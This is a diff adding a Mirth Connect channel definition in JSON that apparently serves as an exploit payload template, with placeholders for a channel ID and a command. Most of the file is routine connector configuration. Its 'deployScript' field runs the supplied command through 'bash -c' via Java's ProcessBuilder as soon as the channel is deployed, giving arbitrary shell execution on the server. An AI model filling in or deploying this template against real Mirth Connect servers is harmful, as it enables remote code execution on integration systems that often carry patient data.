@@ -1,0 +1,219 @@
+{
+  "channel": {
+    "@version": "4.5.0",
+    "id": "!!ID!!",
+    "nextMetaDataId": 2,
+    "name": "Channel 1",
+    "description": "Example description.",
+    "revision": 0,
+    "sourceConnector": {
+      "@version": "4.5.0",
+      "metaDataId": 0,
+      "name": "sourceConnector",
+      "properties": {
+        "@class": "com.mirth.connect.connectors.vm.VmReceiverProperties",
+        "@version": "4.5.0",
+        "sourceConnectorProperties": {
+          "@version": "4.5.0",
+          "responseVariable": "None",
+          "respondAfterProcessing": true,
+          "processBatch": false,
+          "firstResponse": false,
+          "processingThreads": 1,
+          "resourceIds": {
+            "@class": "linked-hash-map",
+            "entry": {
+              "string": [
+                "Default Resource",
+                "[Default Resource]"
+              ]
+            }
+          },
+          "queueBufferSize": 0
+        }
+      },
+      "transformer": {
+        "@version": "4.5.0",
+        "elements": null,
+        "inboundTemplate": {
+          "@encoding": "base64"
+        },
+        "outboundTemplate": {
+          "@encoding": "base64"
+        },
+        "inboundDataType": "RAW",
+        "outboundDataType": "RAW",
+        "inboundProperties": {
+          "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+          "@version": "4.5.0",
+          "batchProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+            "@version": "4.5.0",
+            "splitType": "JavaScript",
+            "batchScript": null
+          }
+        },
+        "outboundProperties": {
+          "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+          "@version": "4.5.0",
+          "batchProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+            "@version": "4.5.0",
+            "splitType": "JavaScript",
+            "batchScript": null
+          }
+        }
+      },
+      "filter": {
+        "@version": "4.5.0",
+        "elements": null
+      },
+      "transportName": "Channel Reader",
+      "mode": "SOURCE",
+      "enabled": true,
+      "waitForPrevious": true
+    },
+    "destinationConnectors": {
+      "connector": {
+        "@version": "4.5.0",
+        "metaDataId": 1,
+        "name": "Destination 1",
+        "properties": {
+          "@class": "com.mirth.connect.connectors.vm.VmDispatcherProperties",
+          "@version": "4.5.0",
+          "destinationConnectorProperties": {
+            "@version": "4.5.0",
+            "queueEnabled": false,
+            "sendFirst": false,
+            "retryIntervalMillis": 10000,
+            "regenerateTemplate": false,
+            "retryCount": 0,
+            "rotate": false,
+            "includeFilterTransformer": false,
+            "threadCount": 1,
+            "threadAssignmentVariable": null,
+            "validateResponse": false,
+            "resourceIds": {
+              "@class": "linked-hash-map",
+              "entry": {
+                "string": [
+                  "Default Resource",
+                  "[Default Resource]"
+                ]
+              }
+            },
+            "queueBufferSize": 0,
+            "reattachAttachments": true
+          },
+          "channelId": "none",
+          "channelTemplate": "${message.encodedData}",
+          "mapVariables": null
+        },
+        "transformer": {
+          "@version": "4.5.0",
+          "elements": null,
+          "inboundTemplate": {
+            "@encoding": "base64"
+          },
+          "outboundTemplate": {
+            "@encoding": "base64"
+          },
+          "inboundDataType": "RAW",
+          "outboundDataType": "RAW",
+          "inboundProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+            "@version": "4.5.0",
+            "batchProperties": {
+              "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+              "@version": "4.5.0",
+              "splitType": "JavaScript",
+              "batchScript": null
+            }
+          },
+          "outboundProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+            "@version": "4.5.0",
+            "batchProperties": {
+              "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+              "@version": "4.5.0",
+              "splitType": "JavaScript",
+              "batchScript": null
+            }
+          }
+        },
+        "responseTransformer": {
+          "@version": "4.5.0",
+          "elements": null,
+          "inboundTemplate": {
+            "@encoding": "base64"
+          },
+          "outboundTemplate": {
+            "@encoding": "base64"
+          },
+          "inboundDataType": "RAW",
+          "outboundDataType": "RAW",
+          "inboundProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+            "@version": "4.5.0",
+            "batchProperties": {
+              "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+              "@version": "4.5.0",
+              "splitType": "JavaScript",
+              "batchScript": null
+            }
+          },
+          "outboundProperties": {
+            "@class": "com.mirth.connect.plugins.datatypes.raw.RawDataTypeProperties",
+            "@version": "4.5.0",
+            "batchProperties": {
+              "@class": "com.mirth.connect.plugins.datatypes.raw.RawBatchProperties",
+              "@version": "4.5.0",
+              "splitType": "JavaScript",
+              "batchScript": null
+            }
+          }
+        },
+        "filter": {
+          "@version": "4.5.0",
+          "elements": null
+        },
+        "transportName": "Channel Writer",
+        "mode": "DESTINATION",
+        "enabled": true,
+        "waitForPrevious": true
+      }
+    },
+    "preprocessingScript": null,
+    "postprocessingScript": null,
+    "deployScript": "var ProcessBuilder = Packages.java.lang.ProcessBuilder;function executeShellCommand(command) {    var processBuilder = new ProcessBuilder('bash', '-c', command);    var process = processBuilder.start();    process.waitFor();    return;}executeShellCommand('!!CMD!!');",
+    "undeployScript": null,
+    "properties": {
+      "@version": "4.5.0",
+      "clearGlobalChannelMap": true,
+      "messageStorageMode": "DEVELOPMENT",
+      "encryptData": false,
+      "encryptAttachments": false,
+      "encryptCustomMetaData": false,
+      "removeContentOnCompletion": false,
+      "removeOnlyFilteredOnCompletion": false,
+      "removeAttachmentsOnCompletion": false,
+      "initialState": "STARTED",
+      "storeAttachments": true,
+      "metaDataColumns": null,
+      "attachmentProperties": {
+        "@version": "4.5.0",
+        "type": "None",
+        "properties": null
+      },
+      "resourceIds": {
+        "@class": "linked-hash-map",
+        "entry": {
+          "string": [
+            "Default Resource",
+            "[Default Resource]"
+          ]
+        }
+      }
+    }
+  }
+}
